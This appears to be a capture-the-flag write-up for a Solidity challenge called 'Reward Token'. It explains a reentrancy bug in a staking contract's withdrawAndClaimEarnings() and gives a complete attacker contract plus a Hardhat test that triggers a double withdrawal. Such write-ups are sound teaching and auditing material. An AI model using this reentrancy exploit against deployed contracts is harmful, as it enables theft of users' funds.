# Reward Token

## Goals

=> Attacker balanceOf should be 100e18 tokens
=> Depostior Contracts balanceOf should be 0
=> Must exploit in two transactions

### Hints

- None

### Solution

- The error lies in `withdrawAndClaimEarnings()`since it writes to storage after an external call through `safeTransferFrom()` this will call our malicious ERC721Receiver contract that will perform a reentrancy attack because the storage wasn't updated yet and can call `withdrawEarnings()` so we can withdraw twice the amount

### Steps

- Just call the deposit function in the attacker contract
- Wait 5 days or => `await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60])`in hardhat test
- Call the attack function and withdraw double the amount

### Attacker Contract

```solidity
contract RewardTokenAttacker is IERC721Receiver {
    IERC721 private nft;
    IERC20 private rewardToken;
    Depositoor private depositor;

    constructor() {}

    function attack(
        address _nft,
        address _depositor,
        address _rewardToken
    ) external {
        // setup for communicating with other contracts
        depositor = Depositoor(_depositor);
        nft = IERC721(_nft);
        rewardToken = IERC20(_rewardToken);
        depositor.withdrawAndClaimEarnings(42);
    }

    function deposit(
        address _nft,
        address _depositor,
        address _rewardToken
    ) external {
        depositor = Depositoor(_depositor);
        nft = IERC721(_nft);
        rewardToken = IERC20(_rewardToken);
        nft.approve(address(depositor), 42);
        nft.safeTransferFrom(address(this), address(depositor), 42);
    }

    /*
     * @title Basic receiver function from IERC721Receiver
     * @notice every time an NFT is received this gets triggered
     * @dev it's used to keep track of the staked nft
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        depositor.claimEarnings(42);
        return IERC721Receiver.onERC721Received.selector;
    }
}

```

### Test

```javascript
it('conduct your attack here', async function () {
	const depositTx = await attackerContract
		.connect(attackerWallet)
		.deposit(NFTToStakeContract.address, depositoorContract.address, rewardTokenContract.address);
	await depositTx.wait();
	await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]);
	await ethers.provider.send('evm_mine');
	const attackTx = await attackerContract
		.connect(attackerWallet)
		.attack(NFTToStakeContract.address, depositoorContract.address, rewardTokenContract.address);
	await attackTx.wait();
});
```
